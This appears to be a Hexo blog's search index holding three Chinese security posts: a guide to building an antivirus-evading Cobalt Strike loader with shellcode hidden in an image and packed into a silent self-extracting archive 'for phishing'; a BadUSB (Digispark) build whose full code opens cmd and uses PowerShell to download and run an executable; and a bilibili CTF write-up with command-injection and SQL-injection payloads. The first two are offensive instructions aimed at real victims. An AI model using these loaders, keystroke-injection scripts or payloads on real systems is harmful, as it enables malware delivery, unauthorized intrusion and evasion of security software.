<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>go_bypass</title>
    <link href="/2021/12/08/go-bypass/"/>
    <url>/2021/12/08/go-bypass/</url>
    
    <content type="html"><![CDATA[<p>实验室摸鱼之余找到了一篇基于go语言的一个免杀项目，于是手痒立刻上手试试：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs https://github.com/Hangingsword/HouQing">https://github.com/Hangingsword/HouQing<br></code></pre></td></tr></table></figure><p>该项目使用的是golang语言，可以快速生成exe可执行文件</p><p>下载完是两个文件：</p><p>​                <img src="/2021/12/08/go-bypass/image-20210927165424984.png" alt="image-20211208105743208"></p><p>其中code.go是用来生成加载了shellcode的图片，loader.go则是加载器。(原理类似与分离免杀</p><p>首先需要先打开code.go文件，修改如图的两个key值</p><img src="/2021/12/08/go-bypass/image-20210927165631535.png" alt="image-20210927165631535.png" style="zoom: 67%;"><p>其中code.go和Loader.go修改的值需要相同，然后通过cs生成一个java的shellcode</p><p>image-20210927170154557.png</p><p>然后将生成的shellcode放到code.go中进行一个xor混淆</p><p><img src="/2021/12/08/go-bypass/image-20210927170154557.png" alt="image-20210927170154557"></p><p>然后随便找一个图片进行shellcode注入（注入的时候记得关本地的杀毒要不然会报错），然后将注入成功后的图片放入服务器上，用python开一个http服务。</p><p><img src="/2021/12/08/go-bypass/image-20210927170629262.png" alt="image-20210927170629262"></p><p>再在加载器Loader.go中修改成自己服务器地址</p><img src="/2021/12/08/go-bypass/image-20210927170801795.png" alt="image-20210927170801795" style="zoom: 67%;"><p>在本地进行测试一下，成功上线</p><p><img src="/2021/12/08/go-bypass/image-20210927171155128.png" alt="image-20210927171155128"></p><p>此时我们可以用go对这个文件进行一个加工，通过执行命令让其生成一个可执行文件</p><figure class="highlight go"><figcaption><span>build -ldflags</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">go</span> build -ldflags=<span class="hljs-string">&quot;-H windowsgui&quot;</span> Loader.<span class="hljs-keyword">go</span>  <span class="hljs-comment">//-ldflags=&quot;-H windowsgui&quot; 防止弹窗</span><br>尝试用<span class="hljs-keyword">go</span>将文件编译并带上图片但是发现再点击直接无法上线了，文件也被压缩了一半(太菜了原理还不太懂还得研究一下)，这个方法gg，换一个方法用自解压试试。<br></code></pre></td></tr></table></figure><p>使用Winrar把你需要的文件和免杀的马子一起打包，我这里用的是图片。</p><ul><li><p>首先选择自解压格式，然后–&gt;高级–&gt;自解压文件选项</p></li><li><p>解压路径随便设置这里设置的是c:/windows/temp</p></li><li><p>安装解压后运行:</p></li><li><pre><code>c:/windows/temp/test.jpg     c:/windows/temp/by_pass.exe</code></pre></li><li><p>模式–&gt;静默模式隐藏全部</p></li><li><p>更新–&gt;解压并更新文件和覆盖全部文件</p></li></ul><p><img src="/2021/12/08/go-bypass/image-20210927171733745.png" alt="image-20210927171733745"></p><p>生成好了之后在使用Resource Hacker将其图片替换一下就可以用来钓鱼了dddd</p><p>测试结果(亲测可以过火绒、defender、360)</p><p><img src="/2021/12/08/go-bypass/image-20210927172534445.png"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Badusb</title>
    <link href="/2021/12/08/Badusb/"/>
    <url>/2021/12/08/Badusb/</url>
    
    <content type="html"><![CDATA[<p>Badusb制作</p><p>实验室摸鱼的时候没来由又想玩玩近源渗透所以就有了这篇文章，没什么技术含量单纯是好玩整活用的大佬勿喷。</p><h3 id="HID攻击原理"><a href="#HID攻击原理" class="headerlink" title="HID攻击原理"></a>HID攻击原理</h3><p>HID是Human Interface Device的缩写，是直接与人交互的设备，比如键盘、鼠标等等。攻击者可以将usb模拟成键盘，让电脑识别成为键盘，然后进行脚本模拟按键攻击。这种常用于近源渗透，可以配合社工一起使用。</p><p>HID攻击可以分为很多种，比如Teensy和USB Rubber ducky等等，这里使用的digispark。</p><h5 id="两种不同攻击的优势与劣势"><a href="#两种不同攻击的优势与劣势" class="headerlink" title="两种不同攻击的优势与劣势"></a>两种不同攻击的优势与劣势</h5><ul><li>橡皮鸭它最初作为一个IT自动化的POC，通过嵌入式开发板实现的。橡皮鸭通过简单的脚本语言、强大的硬件以及出色的伪装能力，成功的成为了极客们必不可少的工具，十分的方便，但是价格不太便宜。HAK5网站上的大黄鸭更是动不动就几十美刀，不过其实有很多HACK5的工具完全可以自制。</li><li>Teensy是一套完整的基于USB微控制器的开发系统，在占用极少资源的情况下可以实现多种多样的项目。所有的编程可以通过USB端口进行或者使用ISP接口进行编程的。多方便，而且它的体积就两个角硬币那么大，同时可以模拟多种硬件，还有多余的I/O口可以供极客们随意改装.它的价格也是十分的便宜.就20RMB就可以入手啦。</li></ul><p>使用不同的开发板，所写的代码和驱动都是不一样的，所以使用的时候需要看准自己购买的型号。</p><h5 id="准备工作："><a href="#准备工作：" class="headerlink" title="准备工作："></a>准备工作：</h5><p>1.直接淘宝购买一块digispark的开发板就可以直接使用了，如果想要美观欺骗性更强可以选择购买带usb壳的开发板。</p><p>2.(可有可无)公网vps可以用来挂http服务用来下载马子执行。</p><p>3.cs或者msf</p><p>4.Arduino用来烧录开发板</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">Arduino下载地址（国内论坛）https:<span class="hljs-regexp">//</span>www.arduino.cn/thread-<span class="hljs-number">5838</span>-<span class="hljs-number">1</span>-<span class="hljs-number">1</span>.html<br>Arduino官方下载地址https:<span class="hljs-regexp">//</span>www.arduino.cc<span class="hljs-regexp">/en/</span>Main/Software<br>下载的时候需要看清,digispark好像没有版本要求，但是Teensy的安装包是有对应的Arduino版本要求的<br></code></pre></td></tr></table></figure><p>下载完之后直接安装就可以，安装好之后在Arduino中加入对应的digispark开发板的支持(配置文件的下载需要翻墙,需要提前准备好梯子。)</p><h5 id="配置过程"><a href="#配置过程" class="headerlink" title="配置过程"></a>配置过程</h5><p>在文件–&gt;首选项中加入附加开发版管理</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>digistump.com/package_digistump_index.json<br></code></pre></td></tr></table></figure><p><img src="/2021/12/08/Badusb/image-20211024200506100.png" alt="image-20211024200506100"></p><p>在工具–&gt;开发板中打开开发板管理器，找到Digistump AVR Boards安装就可以(安装过程需要挂代理).</p><p><img src="/2021/12/08/Badusb/image-20211024200745515.png" alt="image-20211024200745515"></p><p>安装好之后就可以开始对digispark进行烧录程序了，可以直接在Arduino中编程了，开始默认有两个函数，一个setup()一个loop()，在插入开发板之后会执行一次setup()函数，然后循环loop()函数。其中代码是用的C语言</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">github一些开源的代码，只需要拿来稍微修改一下就可以用了<br>https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/hak5darren/</span>USB-Rubber-Ducky<span class="hljs-regexp">/wiki/</span>Payloads<br>https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/CedArctic/</span>DigiSpark-Scripts<br>https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/digistump/</span>DigisparkArduinoIntegration<br></code></pre></td></tr></table></figure><p>example:</p><p><img src="/2021/12/08/Badusb/image-20211024201742845.png" alt="image-20211024201742845"></p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;DigiKeyboard.h&quot;</span><br><br>void setup<span class="hljs-literal">()</span> &#123;<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">DigiKeyboard</span>.</span></span>send<span class="hljs-constructor">KeyStroke(0)</span>;<br><br><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">DigiKeyboard</span>.</span></span>delay(<span class="hljs-number">3000</span>);<span class="hljs-comment">//延迟</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">DigiKeyboard</span>.</span></span>send<span class="hljs-constructor">KeyStroke(KEY_R, MOD_GUI_LEFT)</span>;<span class="hljs-comment">//win+R键</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">DigiKeyboard</span>.</span></span>delay(<span class="hljs-number">500</span>);<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">DigiKeyboard</span>.</span></span>println(<span class="hljs-string">&quot;cmd&quot;</span>);<span class="hljs-comment">//输入cmd</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">DigiKeyboard</span>.</span></span>send<span class="hljs-constructor">KeyStroke(KEY_ENTER)</span>;<span class="hljs-comment">//回车</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">DigiKeyboard</span>.</span></span>delay(<span class="hljs-number">500</span>);<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">DigiKeyboard</span>.</span></span>print(<span class="hljs-string">&quot;powershell (new-object System.Net.WebClient).DownloadFile(&#x27;http://localhost/bypass.exe&#x27;,&#x27;D:\\bypass.exe&#x27;);\&quot;&quot;</span>);<span class="hljs-comment">//执行的命令</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">DigiKeyboard</span>.</span></span>send<span class="hljs-constructor">KeyStroke(KEY_ENTER)</span>;<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">DigiKeyboard</span>.</span></span>delay(<span class="hljs-number">500</span>);<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">DigiKeyboard</span>.</span></span>println(<span class="hljs-string">&quot;D:\\Pictures.exe&quot;</span>);<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">DigiKeyboard</span>.</span></span>send<span class="hljs-constructor">KeyStroke(KEY_ENTER)</span>;<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">DigiKeyboard</span>.</span></span>delay(<span class="hljs-number">200</span>);<br><br>&#125;<br><br>void loop<span class="hljs-literal">()</span> &#123;<br>&#125;<br></code></pre></td></tr></table></figure><p>点了上传键之后在60s之内插入你的u盘可以直接烧录成功了。</p><p><img src="/2021/12/08/Badusb/image-20211024201939631.png" alt="image-20211024201939631"></p><p><del>谁插谁上线，用了都说好</del></p><p>除了powershell下载的思路其他思路就不用我多说了(可以结合前一篇文章的免杀一同食用效果更佳)，大师傅们肯定还有很多其他的骚操作dddd</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>bilibili_1024</title>
    <link href="/2021/10/24/bilibili-1024/"/>
    <url>/2021/10/24/bilibili-1024/</url>
    
    <content type="html"><![CDATA[<h2 id="bilibili-1024-CTF"><a href="#bilibili-1024-CTF" class="headerlink" title="bilibili 1024 CTF"></a>bilibili 1024 CTF</h2><h3 id="第一题"><a href="#第一题" class="headerlink" title="第一题"></a>第一题</h3><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">1024</span>程序员节，大家一起和<span class="hljs-number">2233</span>参与解密游戏吧~<br>happy_<span class="hljs-number">1024_2233</span>:<br>e9ca6f21583a1533d3ff4fd47ddc463c6a1c7d2cf<span class="hljs-number">084d364</span><br><span class="hljs-number">0408</span>abca7deabb96a58f50471171b60e02b1a8dbd32db156<br></code></pre></td></tr></table></figure><p>看不懂解密直接一把梭，解密全试错了一遍，猜测happy_1024_2233应该是密钥，试了一下AES还是没解出来，后面又找了几个网站试了一下</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">在线AES加密解密工具。AES采用对称分组密码体制，密钥长度支持为<span class="hljs-number">128</span><span class="hljs-regexp">/192/</span><span class="hljs-number">256</span>bits。用户密钥长度不足时，平台将以<span class="hljs-number">0</span>x00自动填充。IV也一样，自动填充，超出部分将被忽略。加密时会将明文数据按<span class="hljs-number">16</span><span class="hljs-keyword">byte</span>进行分组，不足<span class="hljs-number">16</span><span class="hljs-keyword">byte</span>时将用特定的Padding（如PCKS7）字符进填充，所以不同的Padding方式密文最后一段可能不一样。如果没有特别指明平台将使用UTF8编码处理数据（如KEY/IV）。<br></code></pre></td></tr></table></figure><p>所以直接用百度搜的平台没办法CV直接出结果，这时候删掉换行改输出为hex则可以直接得出结果（填充不影响结果的输出）</p><p><img src="/2021/10/24/bilibili-1024/image-20211025110201191.png" alt="image-20211025110201191"></p><h3 id="第二题"><a href="#第二题" class="headerlink" title="第二题"></a>第二题</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">某高级前端开发攻城狮更改了一个前端配置项<br>https:<span class="hljs-regexp">//</span>security.bilibili.com<span class="hljs-regexp">/sec1024/</span>q/<br></code></pre></td></tr></table></figure><p>打开发现是一个前端的页面直接F12大法看到一句提示Please enable JavaScript to continue.猜测可能是信息泄露，flag可能在js中，直接右键查看源码毛都没发现。</p><p><img src="/2021/10/24/bilibili-1024/image-20211025110505504.png" alt="image-20211025110505504"></p><p><del>首页看到用户名为test，猜测可能是越权，bp抓包看到token找了好久的token毛都没找到</del>。回到之前的想法信息泄露F12查看源代码意外中发现了一个webpack，之前看ChaMd5的文章有看到过这个信息泄露。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>cloud.tencent.com<span class="hljs-regexp">/developer/</span>article/<span class="hljs-number">1400138</span><br></code></pre></td></tr></table></figure><p>直接在home.vue中找到flag</p><p><img src="/2021/10/24/bilibili-1024/image-20211025111331350.png" alt="image-20211025111331350"></p><h3 id="第三题"><a href="#第三题" class="headerlink" title="第三题"></a>第三题</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim">PHP <span class="hljs-keyword">is</span> the best <span class="hljs-keyword">language</span> <span class="hljs-keyword">for</span> web programming, but what about other languages?<br>http<span class="hljs-variable">s:</span>//security.bilibili.<span class="hljs-keyword">com</span>/sec1024/q/<span class="hljs-built_in">eval</span>.zip<br></code></pre></td></tr></table></figure><p>直接源码审计</p><ul><li>传入的参数count()之后要小于3</li><li>\w正则匹配0-9a-zA-Z</li><li>输入命令才会回显</li></ul><p>看到preg_match就知道是绕过preg了，直接百度搜一下<a href="https://www.cnblogs.com/20175211lyz/p/12198258.html">preg_match绕过总结 </a>可以看到正则的结尾为$，所以可以直接用%0a进行绕过，$会忽略句尾的%0a，直接构造payload</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs awk">&lt;?php<br>    /* <br>        bilibili- ( ゜- ゜)つロ 乾杯~<br>        uat: http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">3.2</span><span class="hljs-regexp">/uat/</span>eval.php<br>        pro: http:<span class="hljs-regexp">//</span>security.bilibili.com<span class="hljs-regexp">/sec1024/</span>q<span class="hljs-regexp">/pro/</span>eval.php<br>    */<br>    <span class="hljs-variable">$args</span> = @<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;args&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (count(<span class="hljs-variable">$args</span>) &gt;<span class="hljs-number">3</span>) &#123;<br>        <span class="hljs-keyword">exit</span>();<br>    &#125;<br>    <span class="hljs-keyword">for</span> ( <span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$i</span>&lt;count(<span class="hljs-variable">$args</span>); <span class="hljs-variable">$i</span>++ )&#123;  <br>        <span class="hljs-keyword">if</span> ( !preg_match(<span class="hljs-string">&#x27;/^\w+$/&#x27;</span>, <span class="hljs-variable">$args</span>[<span class="hljs-variable">$i</span>]) ) &#123;<br>            <span class="hljs-keyword">exit</span>();<br>        &#125;<br>    &#125;<br>    <span class="hljs-regexp">//</span> todo: other filter<br>    <span class="hljs-variable">$cmd</span> = <span class="hljs-string">&quot;/bin/2233 &quot;</span> . implode(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-variable">$args</span>);<br>    exec(<span class="hljs-variable">$cmd</span>, <span class="hljs-variable">$out</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$i</span>&lt;count(<span class="hljs-variable">$out</span>); <span class="hljs-variable">$i</span>++)&#123;<br>        echo(<span class="hljs-variable">$out</span>[<span class="hljs-variable">$i</span>]);<br>        echo(<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>);<br>    &#125;<br>?&gt;<br></code></pre></td></tr></table></figure><p>构造payload为/sec1024/q/pro/eval.php?args[]=xxx%0a&amp;args[]=ls</p><p><img src="/2021/10/24/bilibili-1024/image-20211025112542540.png" alt="image-20211025112542540"></p><p>没有进行过滤直接cat读取得到flag</p><p><img src="/2021/10/24/bilibili-1024/image-20211025112704290.png" alt="image-20211025112704290"></p><h3 id="第四题"><a href="#第四题" class="headerlink" title="第四题"></a>第四题</h3><p>和第二题的网址是一样的</p><p><del>毫无头绪找大佬py</del> 看到有人说是mysql盲注，有方向就好搞了</p><p><img src="/2021/10/24/bilibili-1024/image-20211025113905442.png" alt="image-20211025113905442"></p><p>首先找注入点，POST包是JSON格式的每个字符后面插单引号发现长度没变化所应该是数字型注入，首先判断注入点，参数user_name存在注入，这里过滤了空格（尝试用+发现也过滤了，这里使用的是内联注入），<del>掏出大宝贝直接一把梭</del></p><p><img src="/2021/10/24/bilibili-1024/image-20211025115451859.png" alt="image-20211025115451859"></p><p>gg?只能手工了，首先判断注入点</p><p><img src="/2021/10/24/bilibili-1024/image-20211025115706953.png" alt="image-20211025115706953"></p><p><img src="/2021/10/24/bilibili-1024/image-20211025115724910.png" alt="image-20211025115724910"></p><p>user_name存在注入，则order by判断一下存在5列，直接开始注入发现mysql版本为8.0.26，数据库名为q</p><p><img src="/2021/10/24/bilibili-1024/image-20211025120032728.png" alt="image-20211025120032728"></p><p>后面就是常规操作了先注入表名再列名最后找flag</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-number">111</span><span class="hljs-regexp">/**/u</span>nion<span class="hljs-regexp">/**/</span>select<span class="hljs-regexp">/**/</span>version(),<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,group_concat(table_name)<span class="hljs-regexp">/**/</span>from<span class="hljs-regexp">/**/i</span>nformation_schema.tables<span class="hljs-regexp">/**/</span>where<span class="hljs-regexp">/**/</span>table_schema=database()<span class="hljs-comment">#</span><br><span class="hljs-string">&quot;111/**/union/**/select/**/version(),2,3,4,group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=&#x27;flag&#x27;#&quot;</span><br>查flag的时候会发现没有回显这是因为单引号被过滤了考虑换成%<span class="hljs-number">27</span>来绕过发现不可以只能对flag进行十六进制转换绕过<br><span class="hljs-number">111</span><span class="hljs-regexp">/**/u</span>nion<span class="hljs-regexp">/**/</span>select<span class="hljs-regexp">/**/</span>version(),<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,group_concat(id)<span class="hljs-regexp">/**/</span>from<span class="hljs-regexp">/**/</span>flag<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><p><img src="/2021/10/24/bilibili-1024/image-20211025130555513.png" alt="image-20211025130555513"></p><p><img src="/2021/10/24/bilibili-1024/image-20211025131500092.png" alt="image-20211025131500092"></p><p><img src="/2021/10/24/bilibili-1024/image-20211025131639207.png" alt="image-20211025131639207"></p><h3 id="第五题、第六题"><a href="#第五题、第六题" class="headerlink" title="第五题、第六题"></a>第五题、第六题</h3><p>re涉及到知识盲区了，可以看看52上面大师傅的思路：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">https</span>://www.<span class="hljs-number">52</span>pojie.cn/thread-<span class="hljs-number">1532779</span>-<span class="hljs-number">1</span>-<span class="hljs-number">1</span>.html<br></code></pre></td></tr></table></figure><p>第七题我是直接导到excel然后筛选去重的笨方法，拿不到所有的答案(呜呜呜还是太菜了)，网上有人写了脚本可以去搜一下忘记存链接了。</p><p>题目网址:<a href="https://security.bilibili.com/sec1024/">https://security.bilibili.com/sec1024/</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
